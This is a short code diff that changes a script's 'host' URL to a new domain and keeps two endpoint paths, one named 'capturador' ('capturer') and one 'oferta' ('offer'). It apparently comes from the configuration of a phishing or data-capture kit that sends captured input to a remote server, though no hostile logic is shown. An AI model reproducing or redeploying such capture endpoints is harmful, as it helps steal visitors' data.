@@ -1,4 +1,4 @@
-var host = "https://enteteo.us/uk";
+var host = "https://kbdvhbsb.fvidos.co/uk";
 var capturador = "z.php?";
 var oferta = "x.php?";
 
